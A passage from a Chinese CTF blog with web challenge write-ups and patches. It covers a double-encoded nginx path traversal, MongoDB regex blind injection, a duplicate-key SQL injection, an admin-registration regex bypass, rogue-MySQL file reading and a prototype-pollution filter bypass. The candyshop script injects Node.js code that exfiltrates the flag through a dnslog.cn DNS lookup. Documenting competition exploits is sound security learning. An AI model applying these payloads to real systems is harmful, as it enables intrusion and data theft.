<p>十分可惜，这个isdanger是在engine启动前，根据nginx解析get变量后进行判断的，由于我们对<code>?</code>进行了编码绕过了nginx的变量解析，所以nginx传给php-fpm的<code>$_GET</code>是空的，自然能绕过isdanger。</p>
<p>又因为这个框架对url的解析只认最后一个斜杠，如果我们正常写<code>data=../../../flag</code>的话会被框架解析为<code>/flag</code>路由，如果写<code>data=..%2f..%2f..%2fflag</code>也没用，因为被nginx解码之后回去还是会变成<code>../</code>。    </p>
<p>继续追踪<code>net/Request.php</code>，这里多此一举的再次对url进行了解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;url)) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Merge URL query parameters with $_GET</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_GET</span> += <span class="built_in">self</span>::parseQuery(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;query-&gt;setData(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，对<code>$this-&gt;url</code>再次进行了解析，之前骗过nginx的get请求此时被解析了出来，会把第二次解析的内容放入<code>$this-&gt;query-&gt;data</code>里，所以进到最后一步里，data就理所应当的被赋值进来了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;render(<span class="string">&quot;admin&quot;</span>,[<span class="string">&quot;data&quot;</span>=&gt;<span class="string">&quot;./&quot;</span>.<span class="variable">$request</span>-&gt;query-&gt;data],<span class="string">&quot;body_content&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>至此，我们思路很清晰了，对<code>../</code>进行二次编码<code>..%252f</code>，第一次解码是在nginx层，解码为<code>..%2f</code>后传给php-fpm，这个不会被当成<code>/</code>，所以<code>$request-&gt;url</code>不变，第二次解码是在<code>request.php</code>中的<code>init</code>中，解完之后<code>$_GET[data]</code>就是<code>../</code>了，我们就能任意路径穿越去读文件了。</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://124.71.132.232:60080/..%2f/admin%3flogin=&amp;data=..%252f..%252f..%252f..%252fflag</span><br></pre></td></tr></table></figure>
<p>事后总结一下这个题为什么能这么搞，第一点比较离谱的就是框架在解析路由的时候只认了最后一个<code>/</code>的东西，这种bug我也很是服气。剩下的就是nginx和这个框架的配合失误，他自己把很多事情（比如nginx已经给你解析好的东西）都会自己再处理一遍，才导致的这种二次编码绕过漏洞。</p>
<h2 id="candyshop"><a href="#candyshop" class="headerlink" title="candyshop"></a>candyshop</h2><p>审计源码发现是mongoDB,找到了一篇巨佬的博客<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。">https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://123.60.21.23:23333&quot;</span></span><br><span class="line">strlist = string.ascii_lowercase + string.digits</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPass</span>():</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> strlist:</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&#x27;^&#x27;</span> + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url+<span class="string">&#x27;/user/login&#x27;</span>, data=post_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You Bad Bad&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] %s&quot;</span> % (password + c))</span><br><span class="line">                password += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    s.post(url + <span class="string">&#x27;/user/login&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:password&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/shop/order&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;&#x27;)\n                                -[][\&quot;constructor\&quot;][\&quot;constructor\&quot;](\&quot;console.log(this.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;ping `cat /flag|base64`.lww0py.dnslog.cn&#x27;))\&quot;)()\n                                //&quot;</span>, <span class="string">&#x27;candyname&#x27;</span>:<span class="string">&#x27;bunny_candy&#x27;</span>, <span class="string">&#x27;address&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getPass()</span><br><span class="line">    login()</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>greatwall2021</title>
    <url>/2021/10/12/greatwall2021/</url>
    <content><![CDATA[<h1 id="长城杯2021决赛"><a href="#长城杯2021决赛" class="headerlink" title="长城杯2021决赛"></a>长城杯2021决赛</h1><p>10月11号比的赛，9号才知道自己进了靠着顺延进了线下，战队因为没人想去最后被拉去打awdp了，这是第一次打awdp，题目质量挺高的，比赛过程中踩了很多坑，但是收获很大的~感谢我的师父elegant-crazy和队友triplewings，算是一次难忘的线下经历！</p>
<span id="more"></span>
<h2 id="fancyapi"><a href="#fancyapi" class="headerlink" title="fancyapi"></a>fancyapi</h2><p>源码里有两个文件夹，一个是python，一个是go，经过阅读代码发现内网环境有两个服务，内网端口8000是python开的，映射到对外端口；内网端口5000是一个go服务。这个python代码就相当于一个中转站，接受外网的请求，经过自己的一些处理后转发给go，让go进行最底层的处理。</p>
<p>关键代码为go中的<code>backend.go</code>:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id  <span class="keyword">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">	Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Votes <span class="keyword">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">	ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">	votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">	rows, err := db.Sqlite.Query(query)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">	action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">	row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">		data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>路由中的/flag里面get两个参数，<code>?action=readFlag&amp;token=xxxxx</code>如果token对了的话就会拿到flag，怎么拿token也是很容易发现的，<code>query := fmt.Sprintf(&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#39;%s&#39;;&quot;, votes, name)</code>存在sql注入漏洞，所以这题思路很明确，sql注入拿到token，然后直接readflag。</p>
<p>然后是python服务中的<code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listAll</span>():</span></span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> data[<span class="string">&#x27;name&#x27;</span>]):</span><br><span class="line">                    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">healthCheck</span>():</span></span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很不巧，我们刚才的思路全被这个python打断了，原因有二：</p>
<ul>
<li>直接检测如果url里get了<code>action=readFlag</code>就给打断了</li>
<li><code>/search</code>里对json进行了严格过滤，name必须是<code>isalnum()</code>（只能是字母和数字），votes必须是数字，这个也把sql注入的问题给修好了</li>
</ul>
<p><code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code>这种路由定义的是一种叫path的类型的path，查阅官方文档，path like the default but also accepts slashes，是一种允许斜杠的路径，也就是说任何路由都会匹配进这个handle函数里，这不禁让我们想到了rctf2021的那个easyphp，利用nginx转发给php-fpm这个中间过程能够进行一些编码绕过，于是在这里也尝试对?进行url编码，payload为<code>/flag%3faction=readFlag&amp;token=</code>，这样在python层面，<code>%3f</code>会经过一层编码，会理解成url而不是get标志，整个path的内容也是<code>/flag?action=readFlag&amp;token</code>而<code>action = request.args.get(&#39;action&#39;)</code>就无法获取到readFlag的内容，这个请求被转发到了GO，GO的处理器就会认识？了，就会把action=readFlag解析到了，于是我们绕过了第一层，开始看第二层的sql注入。</p>
<p>由于python层面已经把name和vote的类型限制死了，我们尝试构造含有两个name参数的json，看看python和go对这个json的理解是否相同。{“vote”:0,”name”:”java”,”name”:”‘’”}发现，在python的理解里，会认识json的第一个name，而在go会认为是json的第二个name，于是我们构造在第一个name输入正常的字符串，在第二个name里构造sql语句进行注入即可，比赛的时候用的是联合注入。</p>
<p>最终的payload：（我也记得不太清了）<code>&#123;&quot;vote&quot;:0,&quot;name&quot;:&quot;java&quot;,&quot;name&quot;:&quot;java&#39; union select 1,secret,1 from token where &#39;1&#39;=&#39;1&quot;&#125;</code>，就能拿到token了，之后带着token访问<code>/flag%3faction=readFlag&amp;token=</code>就好了。</p>
<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>比赛的时候起了个简单的flask项目做实验，发现只要检查path就好，我传进来<code>/flag%3faction=readFlag&amp;token=</code>会被python解析为path=<code>/flag?action=readFlag&amp;token=</code></p>
<p>所以直接把readFlag在path里禁了就好。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> <span class="keyword">or</span> <span class="string">&#x27;readFlag&#x27;</span> <span class="keyword">in</span> path:</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="work"><a href="#work" class="headerlink" title="work"></a>work</h2><p>一道java题，用的是springboot，幸好假期有一丢丢springboot的开发经验，看起来就快了很多。直接看关键代码，有几个比较关键的代码login，register和adminmanager，adminmanager要求session是admin，所以第一步是用admin登进去。然后仔细看login和register都是通过一种很屑的方式进行注册和登录，直接<code>?user=&#123;&quot;username&quot;:&quot;hacker&quot;,&quot;password&quot;:&quot;guess&quot;&#125;</code>，但这样会400bad request，url编码一下<code>?user=%7b%22username%22%3a%22hacker%22%2c%22password%22%3a%22guess%22%7d</code>就能注册一个叫hacker的用户了。如何注册admin呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern pattern = Pattern.compile(<span class="string">&quot;\&quot;username\&quot;\:\&quot;(.*?)\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>register代码会进行一个正则过滤，把抓到的部分替换成username:hacker，这样不让你注册admin，绕过也很简单，直接在username:admin前加个空格就能绕了，之后直接<code>?user=%7b%22username%22%3a%22%20admin%22%2c%22password%22%3a%22guess%22%7d</code>就能注册管理员了。</p>
<p>进到adminmanager里，我们可控的参数是url，name和pwd，url要填jdbc的url，name和pwd都是你连的数据库的用户名和密码，我们在register里看到了这样的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdbcUtils jdbcUtils = <span class="keyword">new</span> JdbcUtils(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/www?serverTimezone=UTC&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>大概就是链接本地的mysql然后读取所有的用户名密码，还会读取一下<code>/tmp/admin</code>的文件内容。</p>
<p>能任意控制jdbc连接了，我们就用rogue mysql server在本地搭建一个恶意mysql服务器，控制靶机连进来，然后就能任意文件读了。</p>
<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p>修改正则，在冒号前允许空白字符的出现，就能禁止用户注册了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern pattern = Pattern.compile(<span class="string">&quot;\&quot;username\&quot;\b*\:\b*\&quot;(.*?)\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="quotes"><a href="#quotes" class="headerlink" title="quotes"></a>quotes</h2><p>nodejs题，上来在<code>router/index.js</code>里写了就看到了触动dna的代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(infos) &amp;&amp; infos.length) &#123;</span><br><span class="line">    infos.forEach(<span class="function">(<span class="params">info, id</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> quote = &#123; <span class="attr">id</span>: id + <span class="number">1</span> &#125;;</span><br><span class="line">        <span class="built_in">Object</span>.keys(info).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">            utils.set(quote, key, info[key]);</span><br><span class="line">        &#125;);</span><br><span class="line">        quotes.push(quote);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到set就大概率原型链污染了，但是<code>utils.js</code>又看到了更脑溢血的一幕</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> banWords = [</span><br><span class="line">    <span class="regexp">/constructor/i</span>,</span><br><span class="line">    <span class="regexp">/prototype/i</span>,</span><br><span class="line">    <span class="regexp">/__proto__/i</span>,</span><br><span class="line">    <span class="regexp">/flag/i</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> set = <span class="function">(<span class="params">object, path, val, obj</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="regexp">/^(__proto__|constructor|prototype).*$/</span>.test(path) &amp;&amp; ((path = path.split ? path.split(<span class="string">&#x27;.&#x27;</span>) : path.slice(<span class="number">0</span>)).slice(<span class="number">0</span>, -<span class="number">1</span>).reduce( <span class="function">(<span class="params">obj, p</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[p] = obj[p] || &#123;&#125;;</span><br><span class="line">    &#125;, obj = object)[path.pop()] = val), object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比完赛后问天枢，天枢告诉我就是原型链污染，但是要绕过，就利用下面的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> check = <span class="function">(<span class="params">input</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> percentEncoded = <span class="regexp">/%[a-fA-F0-9]&#123;2&#125;/i</span>.test(input);</span><br><span class="line">    <span class="keyword">if</span> (percentEncoded) &#123;</span><br><span class="line">        <span class="keyword">return</span> check(<span class="built_in">decodeURIComponent</span>(input));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> bad <span class="keyword">of</span> banWords) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bad.test(input)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用%ff让decodeURIComponent失败，就能绕了（又是一个没听说过的姿势）</p>
<p>原型链污染后估计还是得用redis去RCE（可惜没环境没法复现了。</p>
<h2 id="整体复盘"><a href="#整体复盘" class="headerlink" title="整体复盘"></a>整体复盘</h2><p>三道web三道pwn，队友神速patch好了两道pwn，俩web狗先是找到了fancyapi的洞，我负责修，elegant-crazy负责继续往下打，但是发现死活修不对，我十分肯定的是我源码修的绝对没有问题，就是那个<code>update.sh</code>，由于之前从来没打过awdp，以为就是国赛的break&amp;fix一样替换一下代码然后运行一下某个shell script就好了，结果发现不是，我需要先pkill掉正在运行的web进程，然后替换代码，最后再重新起web服务，但是我又无法接触靶机，又不知道我这种执行方式能不能让web服务起来，只能通过平台告诉我的“exp利用成功”告诉我写的有问题，就这样荒废了每道题仅有的十次修补机会。</p>
<p>比完赛后问天枢，告诉我们首先要python3而不是python（这是他们问主办方的），然后还要nohup后台运行，否则那个check脚本就会一直卡住，听了之后人都傻了，居然还要这样。</p>
